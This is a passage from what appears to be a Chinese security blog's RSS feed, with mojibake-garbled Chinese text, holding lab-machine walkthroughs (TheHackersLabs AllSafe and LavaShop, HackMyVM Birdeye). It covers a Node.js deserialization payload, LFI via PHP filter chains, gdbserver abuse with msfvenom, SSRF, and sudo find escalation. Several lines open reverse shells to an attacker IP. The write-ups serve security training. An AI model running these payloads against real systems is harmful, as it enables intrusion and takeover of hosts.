> è¯·å‹¿å°è¯•å°†æ­¤è®¿é—®æƒé™ç”¨äºä»»ä½•æœªç»çº¦å®šçš„ç”¨é€”ã€‚
> æˆ‘ä»¬å†³å®šå¯¹è¯çš„æ—¶é—´å’Œæ–¹å¼ã€‚
> 

æŸ¥çœ‹æ­£åœ¨ç›‘å¬ç«¯å£ï¼Œæœ‰ä¸¤ä¸ªå¼€åœ¨æœ¬åœ°çš„

```python
cisco@allsafe:~$ ss -tulpn
Netid                  State                   Recv-Q                  Send-Q                                   Local Address:Port                                      Peer Address:Port                  Process                  
udp                    UNCONN                  0                       0                                              0.0.0.0:68                                             0.0.0.0:*                                              
tcp                    LISTEN                  0                       4096                                         127.0.0.1:40089                                          0.0.0.0:*                                              
tcp                    LISTEN                  0                       4096                                           0.0.0.0:80                                             0.0.0.0:*                                              
tcp                    LISTEN                  0                       128                                            0.0.0.0:22                                             0.0.0.0:*                                              
tcp                    LISTEN                  0                       4096                                           0.0.0.0:2222                                           0.0.0.0:*                                              
tcp                    LISTEN                  0                       511                                          127.0.0.1:3000                                           0.0.0.0:*                                              
tcp                    LISTEN                  0                       4096                                              [::]:80                                                [::]:*                                              
tcp                    LISTEN                  0                       128                                               [::]:22                                                [::]:*                                              
tcp                    LISTEN                  0                       4096                                              [::]:2222                                              [::]:* 
```

### Node.js ååºåˆ—åŒ–

3000 ç«¯å£è¿˜æ˜¯ä¸€ä¸ª `web` ï¼Œç™»å½•æ¡†

![image.png](/post-images/TheHackersLabsAllSafe/image21.png)

å°† `3000` ç«¯å£è½¬å‘å‡ºæ¥

```python
./socat TCP-LISTEN:3001,fork TCP4:127.0.0.1:3000 &
```

æ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼Œéœ€è¦ä¸‰ä¸ªå‚æ•°

![image.png](/post-images/TheHackersLabsAllSafe/image22.png)

åˆ†åˆ«è¾“å…¥ `cisco` `dark-ops` `drk2025!` æç¤ºè®¤è¯é”™è¯¯

![image.png](/post-images/TheHackersLabsAllSafe/image23.png)

åœ¨ `/vat/log` ä¸­å‘ç° `app.log` ï¼Œä¸å¸¸è§

![image.png](/post-images/TheHackersLabsAllSafe/image24.png)

åœ¨é‡Œè¾¹èƒ½å¾—åˆ°ä¸¤ä¸ªå‡­æ®

![image.png](/post-images/TheHackersLabsAllSafe/image25.png)

```python
DLFJYxLLSzp1x5Ttpsffpg2awuJT5K
```

å°†å¯†ç æ¢æˆ `DLFJYxLLSzp1x5Ttpsffpg2awuJT5K` æˆåŠŸè¿æ¥ï¼ŒèŠå¤©è¿˜æ˜¯ç”¨ä¸­æ–‡ï¼ˆ

è¿™é‡Œå°è¯•ä¸€ä¸‹ SQL æ³¨å…¥ï¼ŒSSTI ä¹‹ç±»çš„ï¼Œä¹Ÿæ²¡èƒ½æ‰¾åˆ°ä»€ä¹ˆ

![image.png](/post-images/TheHackersLabsAllSafe/image26.png)

éœ€è¦çŸ¥é“ 3000 ç«¯å£è¿è¡Œåœ¨ä»€ä¹ˆç¨‹åºä¸Šï¼ŒæŸ¥çœ‹ä¸€ä¸‹æŠ“çš„åŒ…

![image.png](/post-images/TheHackersLabsAllSafe/image27.png)

å› ä¸º `Socket.IO` æ˜¯ Node.js çš„æµè¡Œå®æ—¶åº“ï¼Œæ‰€ä»¥çŒœæµ‹å®ƒæ˜¯ `Node.js`

![image.png](/post-images/TheHackersLabsAllSafe/image28.png)

åœ¨æŸ¥çœ‹è¿›ç¨‹æ—¶ä¹Ÿèƒ½çœ‹åˆ° root è¿è¡Œäº† nodejs

```python
root         308  0.0  1.6 1248480 67224 ?       Ssl  06:28   0:01 node server.js 
```

è¿˜å‘ç°äº†è¿™ä¸ª `Cookie` æ˜¯ä»…ä»…é€šè¿‡ Base64 åŠ å¯†äº†è€Œå·²ï¼Œæ¨¡æ‹Ÿäº†å…¶ä»–ç”¨æˆ·åä¹Ÿæ²¡ä»€ä¹ˆåµç”¨

![image.png](/post-images/TheHackersLabsAllSafe/image29.png)

çœ‹äº†ä¸€ä¸‹è€å¤œå’Œå›½å¤–è€å‹çš„WPï¼ˆhttps://7r1umphk.github.io/post/thl_allsafe.htmlï¼‰ï¼ˆhttps://github.com/nohh022/writeups/blob/main/TheHackerLabs/AllSafe/AllSafe.mdï¼‰æ‰çŸ¥é“è¿™é‡Œæœ‰ååºåˆ—åŒ–æ¼æ´

ä¸€äº›æ–‡ç« ï¼šhttps://cloud.tencent.com/developer/article/1374840

payloadï¼š

```python
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('busybox nc 192.168.56.5 1234 -e /bin/bash', function(error,stdout,stderr){})}()"}
```

è¿›è¡Œ `base64` ç¼–ç ï¼Œæ›¿æ¢ä¸Šå»

![image.png](/post-images/TheHackersLabsAllSafe/image30.png)

æ¥åˆ°æ§åˆ¶å°ï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼Œå…ˆæ–­å¼€å¥—æ¥å­—å¹¶é‡æ–°è¿æ¥ï¼ŒæœåŠ¡å™¨å°±ä¼šé‡æ–°ååºåˆ—åŒ–

```python
socket.close()
socket.connect()
```

è¯»å– `root.txt` å³å¯

![image.png](/post-images/TheHackersLabsAllSafe/image31.png)

## æ€»ç»“

è¦è€å¿ƒ è€å¿ƒ è€å¿ƒ è€å¿ƒ]]></content:encoded>
            <category>é¶æœº</category>
            <category>TheHackerLabs</category>
            <category>Linux</category>
            <category>LFI</category>
            <category>FUZZ</category>
            <category>PasswordSafe</category>
            <category>Make</category>
            <category>Nodejsååºåˆ—åŒ–</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - LavaShop]]></title>
            <link>https://www.sunsetaction.top/2025/10/20/TheHackersLabsLavaShop</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/10/20/TheHackersLabsLavaShop</guid>
            <pubDate>Mon, 20 Oct 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[LavaShop https://labs.thehackerslabs.com/machine/140 Recon PortScan æšä¸¾ 80 ç«¯å£ 1337 ç«¯å£ ç›®å½•æ‰«æ çœ‹ç€åƒæ˜¯å­˜åœ¨ LFI ï¼Œæšä¸¾ä¸€ä¸‹ index.php çš„ page å‚æ•° æ²¡æœ‰æšä¸¾å‡ºæ¥ï¼Œå†æšä¸¾ä¸€ä¸‹å…¶ä»–é¡µé¢æ˜¯å¦å­˜åœ¨å‚æ•° ...]]></description>
            <content:encoded><![CDATA[
# LavaShop

> https://labs.thehackerslabs.com/machine/140
> 

![image.png](/post-images/TheHackersLabsLavaShop/image.png)

## Recon

### PortScan

```python
âœ  LavaShop nmap -sT -min-rate 10000 -p- 192.168.56.129
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-20 21:34 CST
Nmap scan report for 192.168.56.129
Host is up (0.00051s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste
MAC Address: 08:00:27:18:2F:9D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.68 seconds
```

```python
âœ  LavaShop nmap -sT -A -p 22,80,1337 192.168.56.129   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-20 21:35 CST
Nmap scan report for 192.168.56.129
Host is up (0.00046s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp   open  http       Apache httpd 2.4.62
|_http-title: Did not follow redirect to http://lavashop.thl/
|_http-server-header: Apache/2.4.62 (Debian)
1337/tcp open  tcpwrapped
MAC Address: 08:00:27:18:2F:9D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.46 ms 192.168.56.129

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.38 seconds
```

### æšä¸¾

`80` ç«¯å£

![image.png](/post-images/TheHackersLabsLavaShop/image1.png)

1337 ç«¯å£

```python
âœ  LavaShop echo "1234" | nc 192.168.56.129 1337
(UNKNOWN) [192.168.56.129] 1337 (?) : Connection refused
```

ç›®å½•æ‰«æ

```python
âœ  LavaShop feroxbuster --url http://lavashop.thl -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,503,400 -x php,txt
                                                                                                                  
 ___  ___  __   __     __      __         __   ___                                                                
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                                                                 
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                                
by Ben "epi" Risher ğŸ¤“                 ver: 2.11.0                                                                
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                                                
 ğŸ¯  Target Url            â”‚ http://lavashop.thl                                                                  
 ğŸš€  Threads               â”‚ 50                                             
 ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 ğŸ’¢  Status Code Filters   â”‚ [404, 503, 400]
 ğŸ’¥  Timeout (secs)        â”‚ 7
 ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0
 ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ğŸ”  Extract Links         â”‚ true
 ğŸ’²  Extensions            â”‚ [php, txt]
 ğŸ  HTTP methods          â”‚ [GET]
 ğŸ”ƒ  Recursion Depth       â”‚ 4
 ğŸ‰  New Version Available â”‚ https://github.com/epi052/feroxbuster/releases/latest
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      191l      466w     4025c http://lavashop.thl/assets/css/styles.css
200      GET       45l      105w     1539c http://lavashop.thl/index.php
301      GET        9l       28w      312c http://lavashop.thl/pages => http://lavashop.thl/pages/
301      GET        9l       28w      313c http://lavashop.thl/assets => http://lavashop.thl/assets/
301      GET        9l       28w      315c http://lavashop.thl/includes => http://lavashop.thl/includes/
200      GET       45l      105w     1539c http://lavashop.thl/
301      GET        9l       28w      320c http://lavashop.thl/assets/images => http://lavashop.thl/assets/images/
301      GET        9l       28w      317c http://lavashop.thl/assets/css => http://lavashop.thl/assets/css/
301      GET        9l       28w      321c http://lavashop.thl/includes/pages => http://lavashop.thl/includes/pages/
200      GET       19l       40w      698c http://lavashop.thl/includes/header.php
200      GET        8l       20w      424c http://lavashop.thl/includes/nav.php
200      GET        5l       27w      208c http://lavashop.thl/pages/about.php
200      GET       26l       97w     1017c http://lavashop.thl/pages/products.php
200      GET        8l       23w      246c http://lavashop.thl/includes/pages/contact.php
200      GET        4l        7w      139c http://lavashop.thl/pages/contact.php
200      GET        5l       20w      195c http://lavashop.thl/pages/home.php
200      GET        5l       14w      105c http://lavashop.thl/includes/footer.php
200      GET        6l       26w      192c http://lavashop.thl/includes/pages/catalog.php
200      GET        4l       30w      208c http://lavashop.thl/includes/pages/home.php
```

çœ‹ç€åƒæ˜¯å­˜åœ¨ LFI ï¼Œæšä¸¾ä¸€ä¸‹ `index.php` çš„ page å‚æ•°

```python
âœ  LavaShop ffuf -u 'http://lavashop.thl/index.php?page=FUZZ' -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://lavashop.thl/index.php?page=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

about                   [Status: 200, Size: 1268, Words: 140, Lines: 41, Duration: 0ms]
contact                 [Status: 200, Size: 1199, Words: 115, Lines: 40, Duration: 0ms]
home                    [Status: 200, Size: 1539, Words: 192, Lines: 45, Duration: 0ms]
products                [Status: 200, Size: 2077, Words: 296, Lines: 62, Duration: 0ms]
                        [Status: 200, Size: 1539, Words: 192, Lines: 45, Duration: 4ms]
:: Progress: [74332/74332] :: Job [1/1] :: 8333 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

æ²¡æœ‰æšä¸¾å‡ºæ¥ï¼Œå†æšä¸¾ä¸€ä¸‹å…¶ä»–é¡µé¢æ˜¯å¦å­˜åœ¨å‚æ•°

æœ‰ç‚¹é˜´äº†ï¼Œè—åœ¨ `products.php`

```python
âœ  LavaShop ffuf -u 'http://lavashop.thl/pages/products.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt -fs 1017

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://lavashop.thl/pages/products.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1017
________________________________________________

file                    [Status: 200, Size: 2481, Words: 225, Lines: 55, Duration: 1ms]
```

æˆåŠŸåŒ…å«

```python
âœ  LavaShop curl 'http://lavashop.thl/pages/products.php?file=/etc/passwd'                
  <section style="margin-bottom:1.5rem; padding:1rem; background:rgba(0,0,0,.25); border:1px solid rgba(255,255,255,.1); border-radius:12px;">
    <p style="margin:0 0 .75rem;">Incluyendo: <code>/etc/passwd</code></p>
    <pre style="white-space:pre-wrap; overflow:auto; padding:.75rem; background:rgba(0,0,0,.35); border-radius:8px;">
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                                                   
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync                                                                                
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                                                   
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
debian:x:1000:1000:debian,,,:/home/debian:/bin/bash
Rodri:x:1001:1001::/home/Rodri:/bin/bash
```

## LFI

å°†ç”¨æˆ· Rodri æ‹¿å»åå°çˆ†ç ´

```python
LavaShop hydra -l Rodri -P /usr/share/wordlists/rockyou.txt -t 8 192.168.56.129 ssh
```

ç»§ç»­æµ‹è¯• LFIï¼Œå¯ä»¥ä½¿ç”¨ä¼ªåè®®

![image.png](/post-images/TheHackersLabsLavaShop/image2.png)

èƒ½ç›´æ¥è¯» user.txt

![image.png](/post-images/TheHackersLabsLavaShop/image3.png)

ç»§ç»­æµ‹è¯•ï¼Œå°è¯•ä½¿ç”¨ https://github.com/synacktiv/php_filter_chain_generator

```python
python lfi.py --chain '<?php phpinfo();?>'
```

æˆåŠŸæ‰§è¡Œ

![image.png](/post-images/TheHackersLabsLavaShop/image4.png)

åå¼¹ `shell`

```python
python lfi.py --chain '<?php eval(system($_GET["x"])); ?>  '  
```

![image.png](/post-images/TheHackersLabsLavaShop/image5.png)

```python
x=busybox nc 192.168.56.5 1234 -e /bin/bash
```

![image.png](/post-images/TheHackersLabsLavaShop/image6.png)

## ææƒ - Rodri

æŸ¥çœ‹è¿›ç¨‹å¯ä»¥çœ‹åˆ°åå°æœ‰ä¸ª `gdbserver`

![image.png](/post-images/TheHackersLabsLavaShop/image7.png)

ç½‘ä¸Šæ”¶é›†äº†å‡ ä¸ª payload è¿™ä¸ªèƒ½ç”¨ï¼š

[æ¸—é€æµ‹è¯•è¿œç¨‹ GdbServer - HackTricks --- Pentesting Remote GdbServer - HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-remote-gdbserver.html?highlight=gdbserver#pentesting-remote-gdbserver)

```python
# Trick shared by @B1n4rySh4d0w
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 PrependFork=true -f elf -o binary.elf

chmod +x binary.elf

gdb binary.elf

# Set remote debuger target
target extended-remote 192.168.56.129:1337

# Upload elf file
remote put binary.elf binary.elf

# Set remote executable file
set remote exec-file /home/Rodri/binary.elf

# Execute reverse shell executable
run

# You should get your reverse-shell
```

![image.png](/post-images/TheHackersLabsLavaShop/image8.png)

## ææƒ

`root` å¯†ç è—åœ¨ç¯å¢ƒå˜é‡é‡Œé¢

![image.png](/post-images/TheHackersLabsLavaShop/image9.png)]]></content:encoded>
            <category>é¶æœº</category>
            <category>TheHackerLabs</category>
            <category>Linux</category>
            <category>LFI</category>
            <category>Fuzz</category>
            <category>Gdbserver</category>
        </item>
        <item>
            <title><![CDATA[HackMyVM - Birdeye]]></title>
            <link>https://www.sunsetaction.top/2025/10/17/HackMyVMBirdeye</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/10/17/HackMyVMBirdeye</guid>
            <pubDate>Fri, 17 Oct 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Birdeye. https://hackmyvm.eu/machines/machine.php?vm=Birdeye Recon PortScan æšä¸¾ 80 ç«¯å£çš„æœç´¢æ—¶å‘çš„åŒ…å¾ˆå¥‡æ€ª çœ‹ç€å­˜åœ¨ SSRF æ”¹æˆ kali çš„ IP è¯•è¯• å­˜åœ¨ SSRF å¹¶ä¸”åŸæœ¬åé¢çš„ URL æ˜¯ï¼šhttp://...]]></description>
            <content:encoded><![CDATA[
# Birdeye.

> https://hackmyvm.eu/machines/machine.php?vm=Birdeye
> 

![image.png](/post-images/HackMyVMBirdeye/image.png)

## Recon

### PortScan

```python
âœ  Birdeye nmap -sT -min-rate 10000 -p- 192.168.56.127
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-17 19:45 CST
Nmap scan report for 192.168.56.127
Host is up (0.00027s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
5000/tcp open  upnp
MAC Address: 08:00:27:C2:DE:A0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 17.44 seconds
```

```python
âœ  Birdeye nmap -sT -A -p 53,80,5000 192.168.56.127                    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-17 20:02 CST
Nmap scan report for 192.168.56.127
Host is up (0.00046s latency).

PORT     STATE SERVICE VERSION
53/tcp   open  domain  ISC BIND 9.11.3-1ubuntu1.18 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.18-Ubuntu
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: client
|_http-cors: GET POST OPTIONS
5000/tcp open  http    Werkzeug httpd 2.0.3 (Python 3.6.9)
|_http-title: 404 Not Found
|_http-server-header: Werkzeug/2.0.3 Python/3.6.9
MAC Address: 08:00:27:C2:DE:A0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.46 ms 192.168.56.127

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.38 seconds
```

### æšä¸¾

80 ç«¯å£çš„æœç´¢æ—¶å‘çš„åŒ…å¾ˆå¥‡æ€ª

![image.png](/post-images/HackMyVMBirdeye/image1.png)

çœ‹ç€å­˜åœ¨ `SSRF`

![image.png](/post-images/HackMyVMBirdeye/image2.png)

æ”¹æˆ kali çš„ IP è¯•è¯•

![image.png](/post-images/HackMyVMBirdeye/image3.png)

å­˜åœ¨ `SSRF`

![image.png](/post-images/HackMyVMBirdeye/image4.png)

å¹¶ä¸”åŸæœ¬åé¢çš„ URL æ˜¯ï¼š`http://localhost:5000/api/products/?search=""`

## SSRF

åˆ©ç”¨ SSRF æ¼æ´è¿›è¡Œæšä¸¾

é¦–å…ˆæšä¸¾å†…ç½‘ç«¯å£

```python
âœ  Birdeye ffuf -u 'http://192.168.56.127/api/fetch-url?url=http://127.0.0.1:FUZZ/' -w port -fc 500

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.127/api/fetch-url?url=http://127.0.0.1:FUZZ/
 :: Wordlist         : FUZZ: /root/Desktop/HackMyVM/Birdeye/port
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 500
________________________________________________

80                      [Status: 200, Size: 288, Words: 38, Lines: 8, Duration: 106ms]
:: Progress: [10000/10000] :: Job [1/1] :: 357 req/sec :: Duration: [0:00:29] :: Errors: 0 ::
```

æˆ‘ä»¬å†æ ¹æ®åŸæœ¬`403` çš„åœ°å€è¿›è¡Œè®¿é—®ï¼Œä¾‹å¦‚ï¼š

```python
403      GET        1l        5w       32c http://192.168.56.127/admin/config
401      GET        1l        1w       25c http://192.168.56.127/admin/dashboard
```

æˆåŠŸåŒ…å«åˆ°è´¦æˆ·å¯†ç ï¼Œå¹¶ä¸”å‘Šè¯‰æˆ‘ä»¬ `/api/fetch-url` æ”¯æŒ `GET, POST, OPTIONS` ä¸‰ç§æ–¹æ³•

```python
âœ  Birdeye curl -i 'http://192.168.56.127/api/fetch-url?url=http://127.0.0.1/admin/config'
HTTP/1.1 200 OK
Date: Fri, 17 Oct 2025 13:32:01 GMT
Server: Werkzeug/2.0.3 Python/3.6.9
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Headers: Content-Type
Content-Type: application/json
Content-Length: 106
Access-Control-Allow-Origin: *, *
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Headers: Content-Type

{"admin_password":"SuperSecret123!","admin_user":"superadmin","login_panel_path":"/admin/panelloginpage"}
```

æ ¹æ®è·å–åˆ°å†…å®¹è®¿é—®åè®¿é—®åå°åœ°å€

![image.png](/post-images/HackMyVMBirdeye/image5.png)

æˆ‘ä»¬æœ‰å¿…è¦å‘é€ POST æ•°æ®ï¼ˆè¿™é‡Œçœ‹äº†ä¸‹ WPï¼Œæ²¡æƒ³åˆ°æ˜¯è¿™æ ·æ›´æ¢æ–¹æ³•ï¼‰ï¼Œæ‰€ä»¥æ¥ä¸Š `curl -i 'http://192.168.56.127/api/fetch-url?url=http://localhost/admin/panelloginpage&method=POST'`

```python
âœ  Birdeye curl -i 'http://192.168.56.127/api/fetch-url?url=http://localhost/admin/panelloginpage&method=POST' -H 'Content-Type: application/x-www-form-urlencoded' -d 'admin_user=superadmin&admin_password=SuperSecret123!'
HTTP/1.1 200 OK
Date: Fri, 17 Oct 2025 13:35:48 GMT
Server: Werkzeug/2.0.3 Python/3.6.9
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Headers: Content-Type
Content-Type: text/html; charset=utf-8
Content-Length: 145
Access-Control-Allow-Origin: *, *
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Headers: Content-Type
Vary: Cookie,Accept-Encoding
Set-Cookie: session=eyJhZG1pbl9hdXRoZW50aWNhdGVkIjp0cnVlfQ.aPJGNA.-3-eVxjfstKta_I4ubREsK2pnAg; Domain=192.168.1.237; Path=/

    <h2>Admin Dashboard</h2>
    <form method="post">
        <label>Command: <input name="command" type="text"></label>
        <button type="s#   
```

è¿™æ ·å°±æ‹¿åˆ°äº† `Cookie` ï¼Œæˆ‘ä»¬å­˜å‚¨åœ¨ `http://192.168.56.127/admin/dashboard` ä¸­

![image.png](/post-images/HackMyVMBirdeye/image6.png)

çœ‹æ ·å­æ˜¯ä¸ªå‘½ä»¤æ‰§è¡Œçš„åŠŸèƒ½

![image.png](/post-images/HackMyVMBirdeye/image7.png)

è¿›è¡Œåå¼¹ `shell`

```python
command=busybox nc 192.168.56.5 1234 -e /bin/bash
```

## ææƒ - sev

æŸ¥çœ‹ sudo æƒé™

```python
www-data@birdeye:~/birdeye$ sudo -l
Matching Defaults entries for www-data on birdeye:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on birdeye:
    (sev) NOPASSWD: /home/sev/backup_app.sh
```

æŸ¥çœ‹å†…å®¹ï¼Œç›´æ¥ç»™äº†

```python
www-data@birdeye:~/birdeye$ cat /home/sev/backup_app.sh
#!/bin/bash
/bin/bash -p
```

åˆ‡æ¢åˆ° sev

```python
www-data@birdeye:~/birdeye$ sudo -u sev /home/sev/backup_app.sh 
sev@birdeye:~/birdeye$ 
```

## ææƒ - root

```python
sev@birdeye:~/birdeye$ sudo -l
Matching Defaults entries for sev on birdeye:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sev may run the following commands on birdeye:
    (ALL) NOPASSWD: /usr/bin/find
```

ç»“æŸäº†

```python
sev@birdeye:~/birdeye$ sudo find . -exec /bin/sh \; -quit
# id
uid=0(root) gid=0(root) groups=0(root
```

## æ€»ç»“

ï¼Ÿ]]></content:encoded>
            <category>é¶æœº</category>
            <category>HackMyVM</category>
            <category>Linux</category>
            <category>SSRF</category>
            <category>find</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Machine - TombWatcher]]></title>
            <link>https://www.sunsetaction.top/2025/10/13/HackTheBoxSeason8 - TombWatcher</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/10/13/HackTheBoxSeason8 - TombWatcher</guid>
            <pubDate>Sun, 08 Jun 2025 00:00:00 GMT</pubDate>
